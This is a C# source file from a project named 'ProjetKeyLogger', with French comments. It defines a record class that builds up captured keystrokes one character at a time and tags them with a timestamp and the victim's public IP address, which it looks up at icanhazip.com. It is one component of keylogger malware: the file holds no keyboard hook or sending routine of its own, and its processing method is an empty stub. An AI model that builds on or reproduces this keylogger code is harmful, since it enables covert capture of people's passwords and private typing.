using System;
using System.Net;

namespace ProjetKeyLogger
{
    [Serializable]
    public class Enregistrement
    {
        //Contenu de l'enregistrement courrant
        private String contenu;
        private String date;
        private String adresse_ip_publique;

        //proprieté en lecture / ecriture
        public String Contenu
        {
            get
            {
                return contenu;
            }
            set
            {
                contenu = value;
            }
        }
        //proprieté en lecture / ecriture
        public String Date
        {
            get
            {
                return date;
            }
            set
            {
                date = value;
            }
        }

        //proprieté en lecture / ecriture
        public String Adresse_Ip_Publique
        {
            get
            {
                return adresse_ip_publique;
            }
            set
            {
                adresse_ip_publique = value;
            }
        }

        //Renvoit la date et l'heure courrante
        public void dateTimeNow()
        {
            //Date actuelle
            DateTime thisDay = DateTime.Now;

            //retourne la date sous forme de chaine
            date = thisDay.ToString();
        }

        //Renvoie l'adresse IP publique
        public void adresseIpPublique()
        {
            //Retourne l'adresse IP publique
            adresse_ip_publique =  new WebClient().DownloadString("http://icanhazip.com");
        }

        //Fonction qui concatene la derniere touche tapé au clavier , au contenu de l'enregistrement
        public void ajouterContenu(char caractere)
        {
            //Ajout du caracter au contenu du text
            contenu += caractere;
        }

        //Fonction qui supprime le dernier caractere
        public void effacerContenu()
        {
            //Ajout du caracter au contenu du 
            if(contenu.Length != 0)
            {
                contenu = contenu.Substring(0, contenu.Length - 1);
            }
        }

        public String traitementContenue()
        {
            String contenu_claire = this.contenu;



            return contenu_claire;
        }

    }
}
